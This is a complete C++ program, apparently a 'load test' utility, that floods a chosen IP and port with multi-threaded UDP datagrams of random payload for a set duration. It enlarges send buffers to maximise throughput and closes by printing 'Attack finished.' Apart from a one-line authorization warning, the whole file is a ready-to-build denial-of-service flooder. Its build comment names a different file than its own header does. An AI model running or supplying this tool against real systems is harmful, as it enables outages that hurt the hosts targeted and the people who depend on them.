// udp_load_enhanced.cpp
// Build: g++ -std=c++17 Moin.cpp -pthread -O2 -o Moin
//
// WARNING: Use ONLY against machines you own or are authorized to test.

#include <iostream>
#include <thread>
#include <vector>
#include <atomic>
#include <chrono>
#include <random>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>

using namespace std::chrono;

std::atomic<bool> stop_flag{false};

void sender_thread(const std::string &target_ip, uint16_t target_port,
                   uint64_t duration_seconds, size_t thread_id) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        return;
    }

    // Increase send buffer to avoid drops
    int sndbuf = 4 * 1024 * 1024;
    if (setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf)) < 0)
        perror("setsockopt SO_SNDBUF");

    sockaddr_in dst{};
    dst.sin_family = AF_INET;
    dst.sin_port = htons(target_port);
    if (inet_pton(AF_INET, target_ip.c_str(), &dst.sin_addr) != 1) {
        std::cerr << "[thread " << thread_id << "] Invalid IP: " << target_ip << "\n";
        close(sock);
        return;
    }

    // Payload buffer
    const size_t payload_size = 2048;
    std::vector<uint8_t> buf(payload_size);

    // Random payload per thread
    std::mt19937_64 rng((unsigned)steady_clock::now().time_since_epoch().count() + (unsigned)thread_id);
    std::uniform_int_distribution<uint8_t> dist(0, 255);
    for (size_t i = 0; i < payload_size; ++i) buf[i] = dist(rng);

    auto start = steady_clock::now();
    auto end_time = start + seconds(duration_seconds);
    uint64_t sent_packets = 0;

    while (!stop_flag.load() && steady_clock::now() < end_time) {
        ssize_t s = sendto(sock, buf.data(), buf.size(), 0,
                           reinterpret_cast<sockaddr*>(&dst), sizeof(dst));
        if (s > 0) ++sent_packets;

        // Yield occasionally
        if ((sent_packets & 0xFFF) == 0) std::this_thread::yield();
    }

    auto elapsed = duration_cast<seconds>(steady_clock::now() - start).count();
    std::cout << "[thread " << thread_id << "] Sent " << sent_packets
              << " packets in " << elapsed << " s\n";

    close(sock);
}

int main(int argc, char **argv) {
    if (argc != 5) {
        std::cerr << "Usage: " << argv[0] << " <IP> <PORT> <DURATION_SEC> <THREADS>\n"
                  << "Example: " << argv[0] << " 127.0.0.1 9000 30 4\n";
        return 1;
    }

    std::string ip = argv[1];
    uint16_t port = static_cast<uint16_t>(std::stoi(argv[2]));
    uint64_t duration = std::stoull(argv[3]);
    unsigned threads = static_cast<unsigned>(std::stoi(argv[4]));
    if (threads == 0) threads = 1;

    std::cout << "Target: " << ip << ":" << port
              << " Duration: " << duration << "s Threads: " << threads << "\n";

    std::vector<std::thread> pool;
    for (unsigned t = 0; t < threads; ++t)
        pool.emplace_back(sender_thread, ip, port, duration, (size_t)t);

    auto wait_until = steady_clock::now() + seconds(duration);
    while (steady_clock::now() < wait_until && !stop_flag.load())
        std::this_thread::sleep_for(milliseconds(200));

    stop_flag.store(true);

    for (auto &th : pool)
        if (th.joinable()) th.join();

    std::cout << "Attack finished.\n";
    return 0;
}